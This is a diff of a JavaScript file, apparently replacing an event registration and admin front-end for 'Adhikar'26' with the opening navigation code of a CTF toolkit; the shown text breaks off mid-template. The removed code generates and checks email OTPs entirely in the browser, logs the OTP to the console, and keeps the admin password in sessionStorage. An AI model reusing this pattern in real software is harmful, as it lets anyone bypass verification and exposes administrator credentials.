@@ -1,1367 +1,1088 @@
-/* =====================================================
-   Adhikar'26 — Vanilla JS
-   Registration flow + UroPay Gateway + Admin panel
-   ===================================================== */
+/* ================================================
+   SUJANSCTFSOLVER v1.0 — All CTF Tools
+   ================================================ */
 
-const EVENT_DATE = new Date("2026-06-13T09:00:00+05:30");
-
-// API base — read from <meta name="adhikar-api"> in index.html.
-// Falls back to /api.
-const _apiMeta = document.querySelector('meta[name="adhikar-api"]');
-const API_BASE =
-  ((_apiMeta && _apiMeta.content) || window.location.origin).replace(/\/+$/, "") +
-  "/api";
-
-// EmailJS Initialization
-const EMAILJS_PUBLIC_KEY = "7MYjmRFHID52KXBoF";
-const EMAILJS_SERVICE_ID = "service_ih7ntjl";
-const EMAILJS_TEMPLATE_ID = "template_9gk7idl";
-const EMAILJS_OTP_TEMPLATE_ID = "template_8d7elhs";
-const EMAILJS_ASSIGN_TEMPLATE_ID = "template_assign"; // ← Party assignment template (primary account)
-
-// Second EmailJS account — used specifically for Committee assignment emails
-const EMAILJS_COMM_PUBLIC_KEY = "zRHLlDneLr7oBZpMg";
-const EMAILJS_COMM_SERVICE_ID = "service_grtfn4f";
-const EMAILJS_COMM_TEMPLATE_ID = "template_jqezo8h";
-
-if (typeof emailjs !== 'undefined') {
-  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
-}
-
-const AWARDS = [
-  {
-    title: "General Championship Award",
-    desc: "Presented to the institution that achieves the highest overall distinction through exceptional participation and outstanding award-winning performances across the conference.",
-    isGrand: true
-  },
-  { title: "Best Student Speaker", desc: "Awarded to the delegate who demonstrates the highest level of clarity and persuasion." },
-  { title: "Exceptional Debater", desc: "For the individual who masters the art of the rebuttal and logical counter-argument." },
-  { title: "Asset of the Ruling Government", desc: "Recognizing the most strategic and effective defender of government policies." },
-  { title: "Asset of the Opposition", desc: "Honoring the most rigorous and insightful critic of the treasury benches." },
-  { title: "Best Leader of the House", desc: "For the student who displays supreme command and organizational leadership over the proceedings." },
-  { title: "Best Minister", desc: "For the delegate who demonstrates the most profound knowledge of their specific portfolio." },
-  { title: "Most Creative Mind", desc: "For the MP who proposes the most innovative and out-of-the-box legislative solutions." },
-  { title: "Best Orator", desc: "For the speaker with the most powerful command over rhetoric and public address." },
-  { title: "Distinguished Policy Advocate", desc: "Awarded for the most thoroughly researched and detailed legislative contributions." },
-  { title: "Most Impactful Presence", desc: "For the individual who commands the room through sheer conviction and parliamentary aura." },
-];
-
-const TEAM = [
-  { name: "Kshiti Thakkar", image: "assets/team/kshiti.jpg", role: "Team Member", bio: "The Official Unpaid Therapist" },
-  { name: "Saad Neelgund", image: "assets/team/saad.jpg", role: "Team Member", bio: "Loves Background Noise" },
-  { name: "Khushi Dalbanjan", image: "assets/team/khushi.jpg", role: "Team Member", bio: "Khushi likes Prateek Kuhad." },
-  { name: "Manish Tilvalli", image: "assets/team/manish.jpg", role: "Team Member", bio: "Outasses Everyone" },
-  { name: "Maitri Sabharwal", image: "assets/team/maitri.jpg", role: "Team Member", bio: "The Official Bluepaglu💙" },
-  { name: "Kiran Badami", image: "assets/team/kiran.jpg", role: "Team Member", bio: "The 'Pro' in 'Procrastinate'" },
-  { name: "Reeth Markumbi", image: "assets/team/reeth.jpg", role: "Team Member", bio: "I have hardly anything in common with myself." },
-  { name: "Nishtha I", image: "assets/team/nishtha.jpg", role: "Team Member", bio: "Not a bully,It's just you" },
-  { name: "Shreya Naikar", image: "assets/team/shreya.jpg", role: "Team Member", bio: "Partly philosophical, mostly stupid." },
-  { name: "Sambhav Bafna", image: "assets/team/sambhav.jpg", role: "Team Member", bio: "Exists." },
-  { name: "Shashank Habib", image: "assets/team/shashank.jpg", role: "Team Member", bio: "On My Shawshank Redemption Arc" },
-  { name: "Kavan Bhat", image: "assets/team/kavan.jpg", role: "Team Member", bio: "Doesn't even know why he is here" },
-];
-
-const MIDMAC_LOGO = "assets/midmac.png";
-
-const trophySVG = `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"/><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"/><path d="M4 22h16"/><path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"/><path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"/><path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"/></svg>`;
-
-/* ============ Utilities ============ */
-function initials(name) {
-  return name.split(" ").map(p => p[0]).filter(Boolean).slice(0, 2).join("").toUpperCase();
-}
-function pad(n) { return String(n).padStart(2, "0"); }
-function escapeHtml(s) {
-  return String(s ?? "").replace(/[&<>"']/g, m => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[m]));
-}
-function formatStatus(s) {
-  return s.replace("_", " ").replace(/\b\w/g, c => c.toUpperCase());
-}
-function formatDate(iso) {
-  try {
-    const d = new Date(iso);
-    return d.toLocaleString("en-IN", { dateStyle: "medium", timeStyle: "short" });
-  } catch { return iso; }
-}
-
-/* ============ Render static content ============ */
-function renderAwards() {
-  const grid = document.getElementById("awards-grid");
-  if (!grid) return;
-  grid.innerHTML = AWARDS.map((a, i) => `
-    <article class="award-card anim-border ${a.isGrand ? 'card-grand' : ''}" data-testid="award-card-${i}">
-      <div class="award-head">
-        <div class="award-icon">${trophySVG}</div>
-        <span class="award-num">${String(i + 1).padStart(2, "0")}</span>
-      </div>
-      <h3 class="award-title">${a.title}</h3>
-      <p class="award-desc">${a.desc}</p>
-    </article>
-  `).join("");
-}
-function renderTeam() {
-  const grid = document.getElementById("team-grid");
-  if (!grid) return;
-  grid.innerHTML = TEAM.map((m, i) => `
-    <article class="team-portrait-card" data-testid="team-card-${i}">
-      <div class="portrait-wrapper" ${m.bio ? 'data-bio="true"' : ''}>
-        ${m.image ? `
-          <img class="portrait-img" src="${m.image}" alt="${m.name}" 
-            onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-        ` : ''}
-        <div class="portrait-fallback" style="${m.image ? 'display:none' : 'display:flex'}">
-          ${initials(m.name)}
-        </div>
-        ${m.bio ? `<div class="portrait-bio"><p>${m.bio}</p></div>` : ''}
-      </div>
-      <div class="team-info">
-        <h3 class="team-name">${m.name}</h3>
-        <p class="team-role">${m.role || 'Team Member'}</p>
-      </div>
-    </article>
-  `).join("");
-}
-
-function renderMarquee() {
-  const track = document.getElementById("marquee-track");
-  if (!track) return;
-  const chunk = `
-    <div class="marquee-chunk">
-      <div class="marquee-mark"><img src="${MIDMAC_LOGO}" alt="MIDMAC"/></div>
-      <span class="marquee-text">MIDMAC Group Presents</span>
-      <span class="marquee-diamond">◆</span>
-      <span class="marquee-text">ADHIKAR'26</span>
-      <span class="marquee-diamond">◆</span>
-    </div>
-  `;
-  track.innerHTML = chunk.repeat(8);
-}
-
-/* ============ Parties & Committees ============ */
-const PARTY_TBA = `<p class="parties-tba">To be announced by the Secretariat.</p>`;
-
-function makePartyCard(p) {
-  const typeClass = p.type === 'committee' ? 'party-card-comm' : (p.side === 'opposition' ? 'party-card-opp' : 'party-card-ruling');
-  return `
-    <article class="party-card ${typeClass}">
-      <h4 class="party-card-name">${escapeHtml(p.name)}</h4>
-      ${p.description ? `<p class="party-card-desc">${escapeHtml(p.description)}</p>` : ''}
-    </article>`;
-}
-
-async function renderParties() {
-  const rulingEl = document.getElementById('ruling-grid');
-  const oppEl = document.getElementById('opposition-grid');
-  const commEl = document.getElementById('committees-grid');
-  if (!rulingEl || !oppEl || !commEl) return;
-  try {
-    const all = await fetch(`${API_BASE}/parties`).then(r => r.json());
-    const ruling = all.filter(p => p.type === 'party' && p.side === 'ruling');
-    const opp = all.filter(p => p.type === 'party' && p.side === 'opposition');
-    const comm = all.filter(p => p.type === 'committee');
-    rulingEl.innerHTML = ruling.length ? ruling.map(makePartyCard).join('') : PARTY_TBA;
-    oppEl.innerHTML = opp.length ? opp.map(makePartyCard).join('') : PARTY_TBA;
-    commEl.innerHTML = comm.length ? comm.map(makePartyCard).join('') : PARTY_TBA;
-  } catch {
-    rulingEl.innerHTML = oppEl.innerHTML = commEl.innerHTML = PARTY_TBA;
-  }
-}
-
-function initPartiesAdmin() {
-  const form = document.getElementById('party-form');
-  const listEl = document.getElementById('parties-admin-list');
-  if (!form || !listEl) return;
-
-  async function loadList() {
-    try {
-      const all = await fetch(`${API_BASE}/parties`).then(r => r.json());
-      if (!all.length) { listEl.innerHTML = '<p style="opacity:.5;font-size:.85rem;">No entries yet.</p>'; return; }
-      listEl.innerHTML = all.map(p => `
-        <div class="party-admin-row">
-          <span class="party-admin-label">
-            <strong>${escapeHtml(p.name)}</strong>
-            <em style="opacity:.6;font-size:.8rem;"> — ${p.type}${p.side ? ' · ' + p.side : ''}</em>
-          </span>
-          <button class="party-del-btn" data-id="${p.id}" title="Delete">✕</button>
-        </div>`).join('');
-      listEl.querySelectorAll('.party-del-btn').forEach(btn => {
-        btn.addEventListener('click', async () => {
-          if (!confirm(`Delete "${btn.closest('.party-admin-row').querySelector('strong').textContent}"?`)) return;
-          btn.disabled = true;
-          try {
-            await fetch(`${API_BASE}/admin/parties/${btn.dataset.id}`, {
-              method: 'DELETE', headers: { 'X-Admin-Password': adminPassword }
-            });
-            await Promise.all([loadList(), renderParties()]);
-            showToast('Deleted');
-          } catch { showToast('Failed to delete', 'error'); btn.disabled = false; }
-        });
-      });
-    } catch { listEl.innerHTML = '<p style="color:#ff6b6b;font-size:.85rem;">Could not load.</p>'; }
-  }
-
-  form.addEventListener('submit', async e => {
-    e.preventDefault();
-    const name = document.getElementById('party-name').value.trim();
-    const type = document.getElementById('party-type').value;
-    const side = document.getElementById('party-side').value;
-    const description = document.getElementById('party-desc').value.trim();
-    if (!name) return;
-    try {
-      await fetch(`${API_BASE}/admin/parties`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Admin-Password': adminPassword },
-        body: JSON.stringify({ name, type, side, description })
-      });
-      form.reset();
-      await Promise.all([loadList(), renderParties()]);
-      showToast('Added!');
-    } catch { showToast('Failed to add', 'error'); }
-  });
-
-  loadList();
-}
-
-/* ============ Countdown ============ */
-function tickCountdown() {
-  const diff = Math.max(0, EVENT_DATE.getTime() - Date.now());
-  const d = Math.floor(diff / 86400000);
-  const h = Math.floor((diff / 3600000) % 24);
-  const m = Math.floor((diff / 60000) % 60);
-  const s = Math.floor((diff / 1000) % 60);
-  const set = (id, val) => {
-    const el = document.getElementById(id);
-    if (el) el.textContent = pad(val);
-  };
-  set("cd-days", d);
-  set("cd-hours", h);
-  set("cd-minutes", m);
-  set("cd-seconds", s);
-}
-
-/* ============ Navbar ============ */
-function initNavbar() {
-  const nav = document.getElementById("navbar");
-  if (!nav) return;
-  const onScroll = () => nav.classList.toggle("scrolled", window.scrollY > 24);
-  onScroll();
-  window.addEventListener("scroll", onScroll, { passive: true });
-}
-function initMobileMenu() {
-  const toggle = document.getElementById("nav-toggle");
-  const menu = document.getElementById("mobile-menu");
-  const iconMenu = document.getElementById("icon-menu");
-  const iconClose = document.getElementById("icon-close");
-  if (!toggle || !menu) return;
-  const setOpen = (open) => {
-    menu.classList.toggle("hidden", !open);
-    iconMenu.classList.toggle("hidden", open);
-    iconClose.classList.toggle("hidden", !open);
-  };
-  toggle.addEventListener("click", () => setOpen(menu.classList.contains("hidden")));
-  document.querySelectorAll("[data-scroll-top]").forEach(el =>
-    el.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }))
-  );
-  menu.querySelectorAll("a").forEach(a => a.addEventListener("click", () => setOpen(false)));
-}
-function initSmoothScroll() {
-  document.querySelectorAll('a[href^="#"]').forEach(a => {
-    a.addEventListener("click", (e) => {
-      const id = a.getAttribute("href");
-      if (id && id.length > 1 && id.startsWith("#")) {
-        const target = document.querySelector(id);
-        if (target) { e.preventDefault(); target.scrollIntoView({ behavior: "smooth" }); }
-      }
-    });
-  });
-}
-
-/* ============ Reveal ============ */
-function initReveal() {
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach((entry) => {
-      if (entry.isIntersecting) {
-        const idx = Array.from(entry.target.parentElement?.children || []).indexOf(entry.target);
-        entry.target.style.animationDelay = `${Math.max(0, idx * 60)}ms`;
-        entry.target.classList.add("in-view");
-        observer.unobserve(entry.target);
-      }
-    });
-  }, { threshold: 0.12 });
-  document.querySelectorAll(".reveal").forEach(el => observer.observe(el));
-}
-
-/* ============ Accordion ============ */
-function initAccordion() {
-  document.querySelectorAll(".acc-trigger").forEach(btn => {
-    btn.addEventListener("click", () => {
-      const item = btn.closest(".acc-item");
-      const wasOpen = item.classList.contains("open");
-      document.querySelectorAll(".acc-item.open").forEach(i => i.classList.remove("open"));
-      if (!wasOpen) item.classList.add("open");
-    });
-  });
-}
-
-/* ============ Toasts ============ */
-function showToast(message, type = "success") {
-  const container = document.getElementById("toast-container");
-  if (!container) return;
-  const t = document.createElement("div");
-  t.className = `toast ${type}`;
-  t.textContent = message;
-  container.appendChild(t);
-  setTimeout(() => {
-    t.style.animation = "toastOut 0.3s forwards";
-    setTimeout(() => t.remove(), 320);
-  }, 2000);
-}
-/* ============ Email OTP Verification ============ */
-let _otp = null, _otpEmail = null, _otpExpiry = null, _otpVerified = false, _otpTimer = null;
-
-function _genOtp() {
-  return String(Math.floor(100000 + Math.random() * 900000));
-}
-
-async function sendOtp() {
-  const emailInput = document.getElementById('reg-email-input');
-  const nameInput = document.querySelector('#reg-form [name="name"]');
-  const sendBtn = document.getElementById('otp-send-btn');
-  const block = document.getElementById('otp-block');
-  const email = emailInput?.value.trim();
-  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    showToast('Enter a valid email first', 'error'); return;
-  }
-  sendBtn.disabled = true;
-  const orig = sendBtn.textContent;
-  sendBtn.textContent = 'Sending…';
-  try {
-    _otp = _genOtp();
-    _otpEmail = email;
-    _otpExpiry = Date.now() + 10 * 60 * 1000;
-    _otpVerified = false;
-    const name = nameInput?.value.trim() || email.split('@')[0];
-    console.log('[OTP] Sending to:', email, '| OTP:', _otp);
-    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_OTP_TEMPLATE_ID, {
-      to_email: email,
-      email: email,
-      to_name: name,
-      user_name: name,
-      otp: _otp
-    });
-    block.classList.remove('hidden');
-    const otpInput = document.getElementById('otp-input');
-    otpInput.value = '';
-    otpInput.disabled = false;
-    document.getElementById('otp-verify-btn').disabled = false;
-    document.getElementById('otp-verified-msg')?.classList.add('hidden');
-    showToast('OTP sent! Check your inbox.', 'success');
-    _startOtpCountdown();
-  } catch (e) {
-    _otp = null;
-    const msg = e?.text || e?.message || JSON.stringify(e) || 'Unknown error';
-    console.error('[OTP] EmailJS send failed:', e);
-    showToast('OTP failed: ' + msg, 'error');
-  } finally {
-    sendBtn.textContent = orig;
-    sendBtn.disabled = false;
-  }
-}
-
-function _startOtpCountdown() {
-  clearInterval(_otpTimer);
-  let t = 60;
-  const btn = document.getElementById('otp-resend-btn');
-  const cd = document.getElementById('otp-countdown');
-  if (!btn || !cd) return;
-  btn.classList.remove('hidden');
-  btn.disabled = true;
-  cd.textContent = t;
-  _otpTimer = setInterval(() => {
-    t--;
-    cd.textContent = t;
-    if (t <= 0) {
-      clearInterval(_otpTimer);
-      btn.disabled = false;
-      btn.innerHTML = 'Resend OTP';
-    }
-  }, 1000);
-}
-
-function checkOtp() {
-  const code = document.getElementById('otp-input')?.value.trim();
-  if (!_otp || !code || Date.now() > _otpExpiry) {
-    showToast('OTP expired. Please request a new one.', 'error'); return;
-  }
-  if (code === _otp) {
-    _otpVerified = true;
-    document.getElementById('otp-verified-msg')?.classList.remove('hidden');
-    document.getElementById('otp-input').disabled = true;
-    document.getElementById('otp-verify-btn').disabled = true;
-    document.getElementById('otp-resend-btn')?.classList.add('hidden');
-    clearInterval(_otpTimer);
-    showToast('✓ Email verified!', 'success');
-  } else {
-    showToast('Incorrect OTP. Try again.', 'error');
-  }
-}
-
-function _resetOtp() {
-  _otp = null; _otpEmail = null; _otpExpiry = null; _otpVerified = false;
-  clearInterval(_otpTimer);
-  document.getElementById('otp-block')?.classList.add('hidden');
-  document.getElementById('otp-input') && (document.getElementById('otp-input').value = '');
-  document.getElementById('otp-verified-msg')?.classList.add('hidden');
-  document.getElementById('otp-resend-btn')?.classList.add('hidden');
-  const sendBtn = document.getElementById('otp-send-btn');
-  if (sendBtn) { sendBtn.disabled = true; sendBtn.textContent = 'Send OTP'; }
-}
-
-function initOtp() {
-  const emailInput = document.getElementById('reg-email-input');
-  emailInput?.addEventListener('input', () => {
-    const sendBtn = document.getElementById('otp-send-btn');
-    if (!sendBtn) return;
-    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim());
-    sendBtn.disabled = !valid;
-    // if email changed after verification, reset
-    if (_otpVerified && emailInput.value.trim() !== _otpEmail) _resetOtp();
-  });
-  document.getElementById('otp-send-btn')?.addEventListener('click', sendOtp);
-  document.getElementById('otp-verify-btn')?.addEventListener('click', checkOtp);
-  document.getElementById('otp-resend-btn')?.addEventListener('click', sendOtp);
-  document.getElementById('otp-input')?.addEventListener('keydown', e => {
-    if (e.key === 'Enter') { e.preventDefault(); checkOtp(); }
-  });
-}
-
-/* ============ Registration flow ============ */
-const FIELD_LABELS = {
-  name: "Name",
-  email: "Email",
-  phone: "Phone",
-  parent_name: "Parent Name",
-  parent_phone: "Parent Phone",
-  year: "Year",
-  college: "College",
-  role_preference: "Preferred Role",
+// === Navigation ===
+const VIEW_TITLES = {
+  dashboard:'Dashboard',crypto:'Cryptography',encoding:'Encoder / Decoder',
+  web:'Web Security',forensics:'Forensics',stego:'Steganography',
+  reversing:'Reversing',osint:'OSINT',pwn:'Pwn / Exploitation',terminal:'Terminal'
 };
+const VIEW_PATHS = {
+  dashboard:'/home',crypto:'/tools/crypto',encoding:'/tools/encoder',
+  web:'/tools/web',forensics:'/tools/forensics',stego:'/tools/stego',
+  reversing:'/tools/reversing',osint:'/tools/osint',pwn:'/tools/pwn',terminal:'/shell'
+};
+let currentView = 'dashboard';
 
-let currentRegistration = null;
-
-function setStep(n) {
-  for (let i = 1; i <= 3; i++) {
-    document.getElementById(`step-${i}`)?.classList.toggle("hidden", i !== n);
-  }
-  document.querySelectorAll(".step").forEach(el => {
-    const sn = Number(el.dataset.step);
-    el.classList.toggle("active", sn === n);
-    el.classList.toggle("done", sn < n);
+document.querySelectorAll('.nav-item').forEach(item => {
+  item.addEventListener('click',()=>{
+    const view = item.dataset.view;
+    navigateTo(view);
   });
-}
-
-function openRegisterOverlay() {
-  const overlay = document.getElementById("register-overlay");
-  overlay.classList.remove("hidden");
-  document.body.style.overflow = "hidden";
-  setStep(1);
-  document.getElementById("form-err").classList.remove("visible");
-}
-
-function closeRegisterOverlay() {
-  const overlay = document.getElementById("register-overlay");
-  overlay.classList.add("hidden");
-  document.body.style.overflow = "";
-  // reset for next time
-  document.getElementById("reg-form")?.reset();
-  document.getElementById("utr-form")?.reset();
-  currentRegistration = null;
-  setStep(1);
-  _resetOtp();
-}
-
-async function submitRegistration(e) {
-  e.preventDefault();
-  const form = e.target;
-  const btn = document.getElementById("form-submit-btn");
-  const err = document.getElementById("form-err");
-  err.classList.remove("visible");
-
-  if (!_otpVerified) {
-    err.textContent = "Please verify your email with the OTP before proceeding.";
-    err.classList.add("visible");
-    document.getElementById('reg-email-input')?.focus();
-    return;
-  }
-
-  const data = Object.fromEntries(new FormData(form).entries());
-
-  // basic validation
-  for (const k of ["name", "email", "phone", "parent_name", "parent_phone", "year", "college"]) {
-    if (!data[k] || !String(data[k]).trim()) {
-      err.textContent = `Please fill in ${FIELD_LABELS[k] || k}.`;
-      err.classList.add("visible");
-      return;
-    }
-  }
-
-  btn.disabled = true;
-  btn.style.opacity = "0.7";
-  const original = btn.innerHTML;
-  btn.innerHTML = "Submitting…";
-
-  try {
-    const res = await fetch(`${API_BASE}/registrations`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-    });
-    if (!res.ok) {
-      const j = await res.json().catch(() => ({}));
-      throw new Error(j.detail || "Registration failed");
-    }
-    const reg = await res.json();
-    currentRegistration = reg;
-
-    // populate summary
-    document.getElementById("summary-rows").innerHTML = [
-      ["Name", reg.name],
-      ["Email", reg.email],
-      ["Phone", reg.phone],
-      ["Parent", reg.parent_name],
-      ["Institution", reg.college],
-      ["Year", reg.year],
-      ["Role", reg.role_preference],
-    ].map(([k, v]) => `
-      <div class="summary-row">
-        <span class="summary-row-k">${k}</span>
-        <span class="summary-row-v">${escapeHtml(v)}</span>
-      </div>
-    `).join("");
-
-    // Setup deep links and dynamic QR
-    const upiLink = reg.upiString;
-    document.getElementById("phonepe-link").href = upiLink;
-
-    const upiQuery = upiLink.replace("upi://pay?", "");
-    const setHref = (id, href) => {
-      const el = document.getElementById(id);
-      if (el) el.href = href;
-    };
-    setHref("pay-phonepe", `phonepe://pay?${upiQuery}`);
-    setHref("pay-gpay", `tez://upi/pay?${upiQuery}`);
-    setHref("pay-bhim", `bhim://pay?${upiQuery}`);
-    setHref("pay-apple", upiLink);
-
-    // Swap QR image source
-    if (reg.useFallback) {
-      document.getElementById("qr-image").src = reg.qrCodeUrl;
-    } else {
-      document.getElementById("qr-image").src = reg.qrCodeBase64;
-    }
-
-    setStep(2);
-    document.querySelector(".overlay").scrollTo({ top: 0, behavior: "smooth" });
-  } catch (ex) {
-    err.textContent = ex.message || "Could not submit. Please try again.";
-    err.classList.add("visible");
-  } finally {
-    btn.disabled = false;
-    btn.style.opacity = "1";
-    btn.innerHTML = original;
-  }
-}
-
-// Handle 12-Digit UTR submission
-async function submitUtr(e) {
-  e.preventDefault();
-  if (!currentRegistration) return;
-  const btn = document.getElementById("pay-claimed-btn");
-  const err = document.getElementById("utr-err");
-  const input = document.getElementById("utr-input");
-  const utr = input.value.trim();
-
-  err.style.display = "none";
-
-  if (!utr || !/^\d{12}$/.test(utr)) {
-    err.textContent = "Please enter a valid 12-digit UPI Reference Number / UTR.";
-    err.style.display = "block";
-    return;
-  }
-
-  btn.disabled = true;
-  btn.style.opacity = "0.7";
-  const original = btn.textContent;
-  btn.textContent = "Verifying UTR…";
-
-  try {
-    const res = await fetch(`${API_BASE}/registrations/${currentRegistration.id}/submit-utr`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ utr })
-    });
-
-    if (!res.ok) {
-      const j = await res.json().catch(() => ({}));
-      throw new Error(j.detail || "UTR verification failed");
-    }
-
-    // Transition to Step 3: Confirmation
-    document.getElementById("confirm-id-value").textContent = currentRegistration.id;
-    setStep(3);
-    document.querySelector(".overlay").scrollTo({ top: 0, behavior: "smooth" });
-  } catch (ex) {
-    err.textContent = ex.message || "Failed to submit UTR. Please try again.";
-    err.style.display = "block";
-  } finally {
-    btn.disabled = false;
-    btn.style.opacity = "1";
-    btn.textContent = original;
-  }
-}
-
-function initRegistration() {
-  document.querySelectorAll("[data-open-register]").forEach(b =>
-    b.addEventListener("click", openRegisterOverlay)
-  );
-  document.getElementById("overlay-close")?.addEventListener("click", closeRegisterOverlay);
-  document.addEventListener("keydown", (e) => {
-    const overlay = document.getElementById("register-overlay");
-    if (overlay && e.key === "Escape" && !overlay.classList.contains("hidden")) closeRegisterOverlay();
-  });
-
-  document.getElementById("reg-form")?.addEventListener("submit", submitRegistration);
-  document.getElementById("utr-form")?.addEventListener("submit", submitUtr);
-  document.getElementById("back-to-form")?.addEventListener("click", () => setStep(1));
-  document.getElementById("confirm-close")?.addEventListener("click", closeRegisterOverlay);
-
-  // UPI copy buttons
-  document.querySelectorAll(".upi-copy").forEach(btn => {
-    btn.addEventListener("click", async () => {
-      const txt = btn.querySelector("span").textContent.trim();
-      try {
-        await navigator.clipboard.writeText(txt);
-        btn.classList.add("copied");
-        showToast("Copied");
-        setTimeout(() => btn.classList.remove("copied"), 1500);
-      } catch {
-        showToast("Couldn't copy", "error");
-      }
-    });
-  });
-}
-
-/* ============ Admin panel ============ */
-let adminPassword = "";
-let currentFilter = "all";
-let lastRegistrations = [];
-let adminSearchText = "";
-let adminCollegeFilter = "all";
-let _partiesCache = null; // cached full list from /api/parties
-let showOverviewDashboard = false;
-
-async function loadPartiesCache() {
-  try {
-    _partiesCache = await fetch(`${API_BASE}/parties`).then(r => r.json());
-  } catch {
-    _partiesCache = [];
-  }
-}
-
-function adminHeaders() {
-  return { "X-Admin-Password": adminPassword };
-}
-
-async function adminLogin(e) {
-  e.preventDefault();
-  const pw = document.getElementById("admin-password").value.trim();
-  const err = document.getElementById("admin-err");
-  err.classList.remove("visible");
-  if (!pw) {
-    err.textContent = "Enter the password";
-    err.classList.add("visible");
-    return;
-  }
-  try {
-    const res = await fetch(`${API_BASE}/admin/login`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ password: pw }),
-    });
-    if (!res.ok) throw new Error("Invalid password");
-    adminPassword = pw;
-    sessionStorage.setItem("adhikar_admin", pw);
-    document.getElementById("admin-login").classList.add("hidden");
-    document.getElementById("admin-panel").classList.remove("hidden");
-    await loadPartiesCache();       // must complete before renderRows() reads it
-    await loadRegistrations();
-    if (showOverviewDashboard) renderOverview();
-    initPartiesAdmin();
-  } catch (ex) {
-    err.textContent = ex.message || "Login failed";
-    err.classList.add("visible");
-  }
-}
-
-function adminLogout() {
-  adminPassword = "";
-  sessionStorage.removeItem("adhikar_admin");
-  document.getElementById("admin-panel").classList.add("hidden");
-  document.getElementById("admin-login").classList.remove("hidden");
-  document.getElementById("admin-password").value = "";
-  lastRegistrations = [];
-}
-
-function csvCell(v) {
-  const s = String(v ?? "");
-  if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
-  return s;
-}
-
-function exportCsv() {
-  if (!lastRegistrations.length) {
-    showToast("Nothing to export yet", "error");
-    return;
-  }
-  const headers = ["ID", "Name", "Email", "Phone", "Parent Name", "Parent Phone", "Year", "College", "Role Preference", "Portfolio", "Assigned Party", "Assigned Committee", "Notes", "Status", "UTR", "Created At"];
-  const rows = lastRegistrations.map(r => [
-    r.id, r.name, r.email, r.phone, r.parent_name, r.parent_phone, r.year, r.college, r.role_preference, r.portfolio, r.assigned_party || '', r.assigned_committee || '', r.notes, r.status, r.utr, r.created_at
-  ]);
-  const csv = [headers, ...rows].map(row => row.map(csvCell).join(",")).join("\n");
-  const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  const ts = new Date().toISOString().slice(0, 16).replace(/[:T]/g, "-");
-  a.href = url;
-  a.download = `adhikar26-registrations-${ts}.csv`;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  showToast(`Exported ${lastRegistrations.length} registrations`);
-}
-
-function exportVerifiedSheet() {
-  const verified = lastRegistrations.filter(r => r.status === 'verified');
-  if (!verified.length) {
-    showToast("No verified participants yet", "error");
-    return;
-  }
-  const headers = ["#", "Name", "Email", "Phone", "Parent Name", "Parent Phone", "Year", "College", "Role", "Portfolio", "Assigned Party", "Assigned Committee"];
-  const rows = verified.map((r, i) => [
-    i + 1, r.name, r.email, r.phone, r.parent_name, r.parent_phone, r.year, r.college, r.role_preference, r.portfolio || '', r.assigned_party || '', r.assigned_committee || ''
-  ]);
-  const csv = [headers, ...rows].map(row => row.map(csvCell).join(",")).join("\n");
-  const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  const ts = new Date().toISOString().slice(0, 10);
-  a.href = url;
-  a.download = `adhikar26-verified-delegates-${ts}.csv`;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  showToast(`✓ Downloaded sheet for ${verified.length} verified delegate${verified.length !== 1 ? 's' : ''}`);
-}
-
-async function loadRegistrations() {
-  try {
-    const [rRes, sRes] = await Promise.all([
-      fetch(`${API_BASE}/admin/registrations`, { headers: adminHeaders() }),
-      fetch(`${API_BASE}/admin/stats`, { headers: adminHeaders() }),
-    ]);
-    if (rRes.status === 401 || sRes.status === 401) { adminLogout(); return; }
-    if (!rRes.ok) throw new Error("Failed to load");
-    lastRegistrations = await rRes.json();
-    const stats = await sRes.json();
-
-    updateCollegeDropdown();
-    renderStats(stats);
-    renderAnalytics(lastRegistrations);
-    renderRows();
-    if (showOverviewDashboard) renderOverview();
-  } catch (ex) {
-    showToast(ex.message || "Could not load", "error");
-  }
-}
-
-function renderStats(s) {
-  const el = document.getElementById("admin-stats");
-  if (!el) return;
-
-  const statsList = [
-    ["Total", s.total],
-    ["Pending", s.pending],
-    ["Payment claimed", s.payment_claimed],
-    ["Verified", s.verified],
-    ["Rejected", s.rejected],
-  ];
-
-  el.innerHTML = statsList.map(([k, v]) => `
-    <span class="stat-pill"><strong>${v}</strong> ${k}</span>
-  `).join("");
-}
-
-function renderAnalytics(list) {
-  const el = document.getElementById("admin-analytics");
-  if (!el) return;
-
-  const total = list.length;
-  if (total === 0) {
-    el.innerHTML = "";
-    return;
-  }
-
-  // Role Distribution
-  const ruling = list.filter(r => (r.role_preference || "").toLowerCase().includes("ruling")).length;
-  const opposition = list.filter(r => (r.role_preference || "").toLowerCase().includes("opposition")).length;
-
-  const rulingPct = Math.round((ruling / (ruling + opposition || 1)) * 100);
-  const oppositionPct = 100 - rulingPct;
-
-  el.innerHTML = `
